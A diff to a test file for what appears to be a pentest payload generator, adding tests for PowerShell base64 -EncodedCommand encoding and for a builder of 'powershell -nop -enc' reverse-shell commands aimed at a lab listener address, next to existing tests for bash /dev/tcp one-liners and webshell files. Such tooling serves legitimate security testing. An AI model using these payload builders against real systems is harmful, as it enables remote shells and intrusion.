@@ -1,5 +1,8 @@
 import { describe, expect, it } from "vitest";
-import { buildReverseShellPayload, buildWebshellFile } from "./reverseShellPayloads";
+import {
+  buildPowerShellEncodedPayload, buildReverseShellPayload, buildWebshellFile,
+  toPowerShellEncodedCommand,
+} from "./reverseShellPayloads";
 
 describe("buildReverseShellPayload", () => {
   it("builds the standard bash /dev/tcp one-liner", () => {
@@ -19,6 +22,26 @@ describe("buildReverseShellPayload", () => {
       expect(payload).toContain("10.10.14.5");
       expect(payload).toContain("9001");
     }
+  });
+});
+
+describe("toPowerShellEncodedCommand", () => {
+  it("matches PowerShell's own UTF-16LE + base64 -EncodedCommand format", () => {
+    // Cross-checked against Python's independent
+    // base64.b64encode("whoami".encode("utf-16-le")) -> same string.
+    expect(toPowerShellEncodedCommand("whoami")).toBe("dwBoAG8AYQBtAGkA");
+  });
+});
+
+describe("buildPowerShellEncodedPayload", () => {
+  it("produces a quote-free powershell -enc command containing the encoded LHOST/LPORT script", () => {
+    const payload = buildPowerShellEncodedPayload("10.10.14.5", "4444");
+    expect(payload).toMatch(/^powershell -nop -enc [A-Za-z0-9+/]+=*$/);
+    const encoded = payload.replace("powershell -nop -enc ", "");
+    const decoded = Buffer.from(encoded, "base64").toString("utf16le");
+    expect(decoded).toContain("10.10.14.5");
+    expect(decoded).toContain("4444");
+    expect(decoded).not.toContain('"');
   });
 });
 
